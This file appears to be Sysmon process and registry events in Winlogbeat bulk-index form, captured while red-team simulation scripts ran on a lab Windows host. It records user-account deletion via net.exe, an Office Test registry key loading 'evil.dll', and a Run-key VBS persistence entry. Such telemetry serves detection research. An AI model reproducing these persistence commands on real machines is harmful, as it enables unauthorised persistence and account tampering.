{"thread_id":1824,"event_data":{"ParentProcessGuid":"{2D3B23BE-4AEB-5BA2-0000-0010549F1500}","Product":"Microsoft® Windows® Operating System","UtcTime":"2018-09-19 13:11:07.602","Hashes":"MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347","Description":"Net Command","User":"flare-PC\\flare","LogonId":"0xe320","ParentImage":"C:\\Windows\\SysWOW64\\net.exe","ParentCommandLine":"net.exe user macgyver /delete /domain","FileVersion":"6.1.7601.17514 (win7sp1_rtm.101119-1850)","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"C:\\Windows\\system32\\net1 user macgyver /delete /domain","ParentProcessId":"3940","ProcessId":"2256","Company":"Microsoft Corporation","IntegrityLevel":"Medium","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","TerminalSessionId":"1","Image":"C:\\Windows\\SysWOW64\\net1.exe","ProcessGuid":"{2D3B23BE-4AEB-5BA2-0000-001088A01500}"},"@timestamp":"2018-09-19T13:11:07.602Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:11:07.602\nProcessGuid: {2D3B23BE-4AEB-5BA2-0000-001088A01500}\nProcessId: 2256\nImage: C:\\Windows\\SysWOW64\\net1.exe\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Net Command\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\system32\\net1 user macgyver /delete /domain\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=2041012726EF7C95ED51C15C56545A7F,SHA256=A0BE13AC9443ACC6D2EEA474CC82A727BDB7E1009F573DBA34D269F9A6AAA347\nParentProcessGuid: {2D3B23BE-4AEB-5BA2-0000-0010549F1500}\nParentProcessId: 3940\nParentImage: C:\\Windows\\SysWOW64\\net.exe\nParentCommandLine: net.exe user macgyver /delete /domain","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","type":"wineventlog","record_number":"1342","event_id":1,"version":5,"user":{"domain":"NT-AUTORITÄT","identifier":"S-1-5-18","type":"User","name":"SYSTEM"},"host":{"name":"flare-PC"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"U1_18WUBfVn9xHWimjy8"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","Product":"?","Hashes":"MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44","Description":"?","Image":"C:\\Program Files (x86)\\Python27\\python.exe","UtcTime":"2018-09-19 13:11:06.930","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\net_user_add.py\"","FileVersion":"?","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\net_user_add.py","TerminalSessionId":"1","Company":"?","ProcessId":"2532","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","IntegrityLevel":"Medium","ParentProcessId":"3808","ParentProcessGuid":"{2D3B23BE-4AEA-5BA2-0000-00103E631500}","ProcessGuid":"{2D3B23BE-4AEA-5BA2-0000-001072641500}"},"@timestamp":"2018-09-19T13:11:06.930Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"@version":"1","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:11:06.930\nProcessGuid: {2D3B23BE-4AEA-5BA2-0000-001072641500}\nProcessId: 2532\nImage: C:\\Program Files (x86)\\Python27\\python.exe\nFileVersion: ?\nDescription: ?\nProduct: ?\nCompany: ?\nCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\net_user_add.py\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44\nParentProcessGuid: {2D3B23BE-4AEA-5BA2-0000-00103E631500}\nParentProcessId: 3808\nParentImage: C:\\Windows\\SysWOW64\\cmd.exe\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\net_user_add.py\"","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","record_number":"1328","event_id":1,"version":5,"host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"type":"wineventlog","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"ZV_18WUBfVn9xHWinjyv"}}
{"thread_id":1824,"event_data":{"UtcTime":"2018-09-19 13:11:08.078","Image":"C:\\Program Files (x86)\\Python27\\python.exe","EventType":"CreateKey","TargetObject":"HKU\\S-1-5-21-4019173901-3792766986-1456451320-1001\\Software\\Microsoft\\Office Test\\Special","ProcessId":"3800","ProcessGuid":"{2D3B23BE-4AEB-5BA2-0000-00103BA31500}"},"@timestamp":"2018-09-19T13:11:08.078Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Registry object added or deleted:\nRuleName: \nEventType: CreateKey\nUtcTime: 2018-09-19 13:11:08.078\nProcessGuid: {2D3B23BE-4AEB-5BA2-0000-00103BA31500}\nProcessId: 3800\nImage: C:\\Program Files (x86)\\Python27\\python.exe\nTargetObject: HKU\\S-1-5-21-4019173901-3792766986-1456451320-1001\\Software\\Microsoft\\Office Test\\Special","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Registry object added or deleted (rule: RegistryEvent)","record_number":"1345","event_id":12,"host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"version":2,"type":"wineventlog","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"ZF_18WUBfVn9xHWinjyv"}}
{"thread_id":1824,"event_data":{"UtcTime":"2018-09-19 13:11:08.078","Image":"C:\\Program Files (x86)\\Python27\\python.exe","Details":"c:\\windows\\temp\\evil.dll","EventType":"SetValue","TargetObject":"HKU\\S-1-5-21-4019173901-3792766986-1456451320-1001\\Software\\Microsoft\\Office Test\\Special\\Perf\\(Default)","ProcessId":"3800","ProcessGuid":"{2D3B23BE-4AEB-5BA2-0000-00103BA31500}"},"@timestamp":"2018-09-19T13:11:08.078Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Registry value set:\nRuleName: \nEventType: SetValue\nUtcTime: 2018-09-19 13:11:08.078\nProcessGuid: {2D3B23BE-4AEB-5BA2-0000-00103BA31500}\nProcessId: 3800\nImage: C:\\Program Files (x86)\\Python27\\python.exe\nTargetObject: HKU\\S-1-5-21-4019173901-3792766986-1456451320-1001\\Software\\Microsoft\\Office Test\\Special\\Perf\\(Default)\nDetails: c:\\windows\\temp\\evil.dll","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Registry value set (rule: RegistryEvent)","event_id":13,"type":"wineventlog","version":2,"user":{"name":"SYSTEM","identifier":"S-1-5-18","type":"User","domain":"NT-AUTORITÄT"},"host":{"name":"flare-PC"},"record_number":"1347","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"aF_18WUBfVn9xHWipjyC"}}
{"thread_id":1824,"event_data":{"UtcTime":"2018-09-19 13:11:10.090","Image":"C:\\Program Files (x86)\\Python27\\python.exe","EventType":"DeleteKey","TargetObject":"HKU\\S-1-5-21-4019173901-3792766986-1456451320-1001\\Software\\Microsoft\\Office Test\\Special","ProcessId":"3800","ProcessGuid":"{2D3B23BE-4AEB-5BA2-0000-00103BA31500}"},"@timestamp":"2018-09-19T13:11:10.090Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Registry object added or deleted:\nRuleName: \nEventType: DeleteKey\nUtcTime: 2018-09-19 13:11:10.090\nProcessGuid: {2D3B23BE-4AEB-5BA2-0000-00103BA31500}\nProcessId: 3800\nImage: C:\\Program Files (x86)\\Python27\\python.exe\nTargetObject: HKU\\S-1-5-21-4019173901-3792766986-1456451320-1001\\Software\\Microsoft\\Office Test\\Special","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Registry object added or deleted (rule: RegistryEvent)","event_id":12,"record_number":"1349","version":2,"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"type":"wineventlog","host":{"name":"flare-PC"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"bF_18WUBfVn9xHWisDzg"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","UtcTime":"2018-09-19 13:11:12.107","ParentProcessGuid":"{2D3B23BE-4AF0-5BA2-0000-0010E4CE1500}","Description":"?","Product":"?","Hashes":"MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44","FileVersion":"?","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\persistent_scripts.py\"","Image":"C:\\Program Files (x86)\\Python27\\python.exe","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\persistent_scripts.py","ParentProcessId":"2392","ProcessId":"3672","TerminalSessionId":"1","IntegrityLevel":"Medium","Company":"?","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","ProcessGuid":"{2D3B23BE-4AF0-5BA2-0000-001020D01500}"},"@timestamp":"2018-09-19T13:11:12.123Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:11:12.107\nProcessGuid: {2D3B23BE-4AF0-5BA2-0000-001020D01500}\nProcessId: 3672\nImage: C:\\Program Files (x86)\\Python27\\python.exe\nFileVersion: ?\nDescription: ?\nProduct: ?\nCompany: ?\nCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\persistent_scripts.py\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=6E8B813C218546F9DF6F17F4B97B06EE,SHA256=C7817E6DA74A7AE196EB2D35CE21319ABE3A62CD23AB4DB39FA5138DF7CA1D44\nParentProcessGuid: {2D3B23BE-4AF0-5BA2-0000-0010E4CE1500}\nParentProcessId: 2392\nParentImage: C:\\Windows\\SysWOW64\\cmd.exe\nParentCommandLine: C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Program Files (x86)\\Python27\\python.exe\" C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\persistent_scripts.py\"","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1351","event_id":1,"task":"Process Create (rule: ProcessCreate)","host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","type":"User","domain":"NT-AUTORITÄT"},"version":5,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"cV_18WUBfVn9xHWisDzg"}}
{"thread_id":1824,"event_data":{"UtcTime":"2018-09-19 13:11:12.875","Image":"C:\\Windows\\SysWOW64\\cscript.exe","Details":"wscript.exe //B \"C:\\Users\\flare\\rta-vbs-persistence-run-key.vbs\"","EventType":"SetValue","TargetObject":"HKU\\S-1-5-21-4019173901-3792766986-1456451320-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\rta-vbs-persistence","ProcessId":"2252","ProcessGuid":"{2D3B23BE-4AF0-5BA2-0000-0010B1FA1500}"},"@timestamp":"2018-09-19T13:11:12.875Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Registry value set:\nRuleName: \nEventType: SetValue\nUtcTime: 2018-09-19 13:11:12.875\nProcessGuid: {2D3B23BE-4AF0-5BA2-0000-0010B1FA1500}\nProcessId: 2252\nImage: C:\\Windows\\SysWOW64\\cscript.exe\nTargetObject: HKU\\S-1-5-21-4019173901-3792766986-1456451320-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\rta-vbs-persistence\nDetails: wscript.exe //B \"C:\\Users\\flare\\rta-vbs-persistence-run-key.vbs\"","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","event_id":13,"record_number":"1359","version":2,"host":{"name":"flare-PC"},"task":"Registry value set (rule: RegistryEvent)","user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"b1_18WUBfVn9xHWisDzg"}}
{"thread_id":1824,"event_data":{"CreationUtcTime":"2018-09-19 13:11:12.669","UtcTime":"2018-09-19 13:11:12.669","Image":"C:\\Windows\\SysWOW64\\cscript.exe","TargetFilename":"C:\\Users\\flare\\rta-vbs-persistence-task.vbs","ProcessId":"2252","ProcessGuid":"{2D3B23BE-4AF0-5BA2-0000-0010B1FA1500}"},"@timestamp":"2018-09-19T13:11:12.669Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"File created:\nRuleName: \nUtcTime: 2018-09-19 13:11:12.669\nProcessGuid: {2D3B23BE-4AF0-5BA2-0000-0010B1FA1500}\nProcessId: 2252\nImage: C:\\Windows\\SysWOW64\\cscript.exe\nTargetFilename: C:\\Users\\flare\\rta-vbs-persistence-task.vbs\nCreationUtcTime: 2018-09-19 13:11:12.669","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"File created (rule: FileCreate)","record_number":"1356","event_id":11,"host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"type":"wineventlog","version":2,"opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"dF_18WUBfVn9xHWi0Dwc"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","UtcTime":"2018-09-19 13:11:19.956","ParentProcessGuid":"{2D3B23BE-4AF0-5BA2-0000-001020D01500}","Description":"Userinit-Anmeldeanwendung","Hashes":"MD5=61AC3EFDFACFDD3F0F11DD4FD4044223,SHA256=538FE1012FEDC72727A8DE0C2C01944B3D35C29812ECEF88E95AAC07235E0B0B","Product":"Betriebssystem Microsoft® Windows®","ParentImage":"C:\\Program Files (x86)\\Python27\\python.exe","ParentCommandLine":"\"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\persistent_scripts.py","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","Company":"Microsoft Corporation","ParentProcessId":"3672","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","ProcessId":"900","IntegrityLevel":"Medium","CommandLine":"C:\\Windows\\System32\\userinit.exe","Image":"C:\\Windows\\SysWOW64\\userinit.exe","TerminalSessionId":"1","ProcessGuid":"{2D3B23BE-4AF7-5BA2-0000-0010401B1600}"},"@timestamp":"2018-09-19T13:11:19.956Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:11:19.956\nProcessGuid: {2D3B23BE-4AF7-5BA2-0000-0010401B1600}\nProcessId: 900\nImage: C:\\Windows\\SysWOW64\\userinit.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Userinit-Anmeldeanwendung\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\System32\\userinit.exe\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=61AC3EFDFACFDD3F0F11DD4FD4044223,SHA256=538FE1012FEDC72727A8DE0C2C01944B3D35C29812ECEF88E95AAC07235E0B0B\nParentProcessGuid: {2D3B23BE-4AF0-5BA2-0000-001020D01500}\nParentProcessId: 3672\nParentImage: C:\\Program Files (x86)\\Python27\\python.exe\nParentCommandLine: \"C:\\Program Files (x86)\\Python27\\python.exe\"  C:\\Users\\flare\\Downloads\\RTA-master\\red_ttp\\persistent_scripts.py","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","event_id":1,"record_number":"1361","version":5,"host":{"name":"flare-PC"},"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"type":"wineventlog","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"dV_18WUBfVn9xHWi1zzy"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","User":"flare-PC\\flare","UtcTime":"2018-09-19 13:11:20.284","Hashes":"MD5=38AE1B3C38FAEF56FE4907922F0385BA,SHA256=D5BC504277172BE5C54B60AD5C13209DC1F729131DEF084DE3EC8C72E54C58EF","Description":"Windows-Explorer","ParentProcessGuid":"{2D3B23BE-4AF7-5BA2-0000-0010401B1600}","Image":"C:\\Windows\\explorer.exe","ParentImage":"C:\\Windows\\SysWOW64\\userinit.exe","ParentCommandLine":"C:\\Windows\\System32\\userinit.exe","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","CommandLine":"C:\\Windows\\Explorer.EXE","Company":"Microsoft Corporation","ProcessId":"1160","TerminalSessionId":"1","IntegrityLevel":"Medium","ParentProcessId":"900","CurrentDirectory":"C:\\Users\\flare\\Downloads\\RTA-master\\","Product":"Betriebssystem Microsoft® Windows®","ProcessGuid":"{2D3B23BE-4AF8-5BA2-0000-0010F61C1600}"},"@timestamp":"2018-09-19T13:11:20.284Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:11:20.284\nProcessGuid: {2D3B23BE-4AF8-5BA2-0000-0010F61C1600}\nProcessId: 1160\nImage: C:\\Windows\\explorer.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Windows-Explorer\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\Explorer.EXE\nCurrentDirectory: C:\\Users\\flare\\Downloads\\RTA-master\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=38AE1B3C38FAEF56FE4907922F0385BA,SHA256=D5BC504277172BE5C54B60AD5C13209DC1F729131DEF084DE3EC8C72E54C58EF\nParentProcessGuid: {2D3B23BE-4AF7-5BA2-0000-0010401B1600}\nParentProcessId: 900\nParentImage: C:\\Windows\\SysWOW64\\userinit.exe\nParentCommandLine: C:\\Windows\\System32\\userinit.exe","@version":"1","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"type":"wineventlog","record_number":"1362","event_id":1,"version":5,"user":{"name":"SYSTEM","identifier":"S-1-5-18","domain":"NT-AUTORITÄT","type":"User"},"host":{"name":"flare-PC"},"task":"Process Create (rule: ProcessCreate)","opcode":"Info"}
{"index":{"_index":"winlogbeat-6.4.0-2018.09.19","_type":"doc","_id":"eV_18WUBfVn9xHWi1zz1"}}
{"thread_id":1824,"event_data":{"LogonId":"0xe320","Product":"Betriebssystem Microsoft® Windows®","ParentProcessGuid":"{2D3B23BE-4AF8-5BA2-0000-0010F61C1600}","Hashes":"MD5=D44741F65A1D71F65814A12CF6E2400A,SHA256=C6721F830675ADC7E7FDE2B5E822E56F6A063146F5066F1E25EBFE86F0A87136","Description":"Wrapper für einmaliges Ausführen","Image":"C:\\Windows\\SysWOW64\\runonce.exe","UtcTime":"2018-09-19 13:11:20.565","FileVersion":"6.1.7600.16385 (win7_rtm.090713-1255)","ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"C:\\Windows\\Explorer.EXE","TerminalSessionId":"1","CommandLine":"C:\\Windows\\SysWOW64\\runonce.exe /Run6432","ParentProcessId":"1160","ProcessId":"2388","LogonGuid":"{2D3B23BE-45CC-5BA2-0000-002020E30000}","Company":"Microsoft Corporation","IntegrityLevel":"Medium","CurrentDirectory":"C:\\Windows\\SysWOW64\\","User":"flare-PC\\flare","ProcessGuid":"{2D3B23BE-4AF8-5BA2-0000-00100B491600}"},"@timestamp":"2018-09-19T13:11:20.581Z","log_name":"Microsoft-Windows-Sysmon/Operational","level":"Informationen","computer_name":"flare-PC","source_name":"Microsoft-Windows-Sysmon","process_id":1304,"message":"Process Create:\nRuleName: \nUtcTime: 2018-09-19 13:11:20.565\nProcessGuid: {2D3B23BE-4AF8-5BA2-0000-00100B491600}\nProcessId: 2388\nImage: C:\\Windows\\SysWOW64\\runonce.exe\nFileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\nDescription: Wrapper für einmaliges Ausführen\nProduct: Betriebssystem Microsoft® Windows®\nCompany: Microsoft Corporation\nCommandLine: C:\\Windows\\SysWOW64\\runonce.exe /Run6432\nCurrentDirectory: C:\\Windows\\SysWOW64\\\nUser: flare-PC\\flare\nLogonGuid: {2D3B23BE-45CC-5BA2-0000-002020E30000}\nLogonId: 0xe320\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: MD5=D44741F65A1D71F65814A12CF6E2400A,SHA256=C6721F830675ADC7E7FDE2B5E822E56F6A063146F5066F1E25EBFE86F0A87136\nParentProcessGuid: {2D3B23BE-4AF8-5BA2-0000-0010F61C1600}\nParentProcessId: 1160\nParentImage: C:\\Windows\\explorer.exe\nParentCommandLine: C:\\Windows\\Explorer.EXE","@version":"1","provider_guid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","beat":{"version":"6.4.0","name":"flare-PC","hostname":"flare-PC"},"tags":["beats_input_codec_plain_applied"],"task":"Process Create (rule: ProcessCreate)","record_number":"1364","event_id":1,"host":{"name":"flare-PC"},"version":5,"type":"wineventlog","user":{"name":"SYSTEM","domain":"NT-AUTORITÄT","type":"User","identifier":"S-1-5-18"},"opcode":"Info"}
